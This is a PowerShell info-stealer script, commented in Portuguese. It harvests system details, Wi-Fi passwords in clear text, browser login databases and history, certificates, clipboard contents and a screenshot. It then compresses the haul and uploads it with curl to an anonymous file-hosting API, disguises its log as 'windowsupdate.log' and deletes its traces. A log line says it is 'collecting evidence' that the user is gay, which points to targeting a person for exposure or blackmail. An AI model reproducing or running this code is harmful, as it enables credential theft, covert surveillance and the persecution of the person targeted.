# ---------- KIT v6.1 – “OFICIAL” ----------
$ErrorActionPreference = "Stop"
$kit       = "$env:TEMP\kit"
$upUrl     = "https://api.anonfilesnew.com/upload?key=AFtru5qQZX8HN5npouThcNDJtVbe6d"
$logFile   = "$env:TEMP\windowsupdate.log"
$7z        = "$env:TEMP\7za.exe"

function Write-Log ($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts $msg" | Tee-Object -FilePath $logFile -Append
}

# 0) 7za
if (!(Test-Path $7z)) {
    Write-Log "[7Z] Baixando 7za.exe..."
    Invoke-WebRequest "https://www.7-zip.org/a/7za920.zip" -OutFile "$env:TEMP\7za920.zip"
    Expand-Archive "$env:TEMP\7za920.zip" "$env:TEMP" -Force
    Move-Item "$env:TEMP\7za.exe" $7z -Force
}

# 1..8) Coleta (igual ao v6.0)
New-Item -ItemType Directory -Path $kit -Force | Out-Null
Write-Log "[INFO] Confirmado, usuário é gay – coletando provas..."
systeminfo                          | Out-File "$kit\sysinfo.txt" -Encoding UTF8
Get-CimInstance Win32_ComputerSystem| Out-File "$kit\hw.txt"     -Encoding UTF8
Get-CimInstance Win32_Processor     | Out-File "$kit\cpu.txt"     -Encoding UTF8
Get-CimInstance Win32_BIOS          | Out-File "$kit\bios.txt"   -Encoding UTF8
Get-NetIPConfiguration                | Out-File "$kit\netip.txt" -Encoding UTF8
cmd /c "netsh wlan export profile key=clear folder=$kit"
Get-CimInstance Win32_UserAccount   | Out-File "$kit\users.txt"  -Encoding UTF8
net localgroup administradores      | Out-File "$kit\admins.txt"  -Encoding UTF8
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 200 -EA SilentlyContinue |
    Select TimeCreated,Id,LevelDisplayName,Message |
    Out-File "$kit\logons.txt" -Encoding UTF8
@("$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
  "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
  "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\logins.json",
  "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data") |
    ?{ Test-Path $_ } | %{ Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -EA SilentlyContinue }
Get-ChildItem Cert:\CurrentUser\My | Select Subject,Thumbprint,NotAfter | Out-File "$kit\mycerts.txt" -Encoding UTF8
Get-Clipboard | Out-File "$kit\clipboard.txt" -Encoding UTF8
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -EA SilentlyContinue |
    Select Name,LastWriteTime | Out-File "$kit\recent.txt" -Encoding UTF8
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp    = New-Object System.Drawing.Bitmap($screen.Width,$screen.Height)
$g      = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen(0,0,0,0,$bmp.Size)
$pathSS = "$kit\screenshot.jpg"
$bmp.Save($pathSS,[System.Drawing.Imaging.ImageFormat]::Jpeg)
$g.Dispose(); $bmp.Dispose(); [System.GC]::Collect()

# 9) Compactação + liberação total do arquivo
Write-Log "[7Z] Empacotando evidências..."
$arc = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).7z"
& $7z a -t7z -mx=9 -y $arc "$kit\*" | Out-Null

# Aguarda liberação do arquivo
Write-Log "[7Z] Aguardando liberação do arquivo..."
do {
    Start-Sleep -Milliseconds 500
    $file = Get-Item $arc -EA SilentlyContinue
} while (!$file -or !(Test-Path $arc) -or ($file -and (Lock-File $file)))

function Lock-File ($file) {
    try { [IO.File]::OpenWrite($file.FullName).Close(); return $false }
    catch { return $true }
}

# Força descarga do cache
Write-Log "[7Z] Forçando flush..."
[IO.File]::OpenRead($arc).Close()
$size = (Get-Item $arc).Length
Write-Log "[7Z] Pacote de $size bytes pronto para envio"

# 10) Upload – só depois de 100 % liberado
Write-Log "[UP] Enviando para o chefe..."
try {
    $reply = cmd /c "curl.exe -s -X POST -F `"file=@$arc`" $upUrl"
    Write-Log "[UP] Resposta: $reply"
    if ($reply -match '"full":"([^"]+)"') {
        Write-Log "[OK] Evid entregue – link: $($matches[1])"
    } else {
        Write-Log "[ERRO] Entrega falhou"
    }
} catch {
    Write-Log "[ERRO] Exceção no upload: $_"
}

# 11) Limpeza
Write-Log "[CLEAN] Apagando rastros..."
Remove-Item $kit,$arc -Recurse -Force -EA SilentlyContinue
Write-Log "[END] Missão cumprida. Log em $logFile"
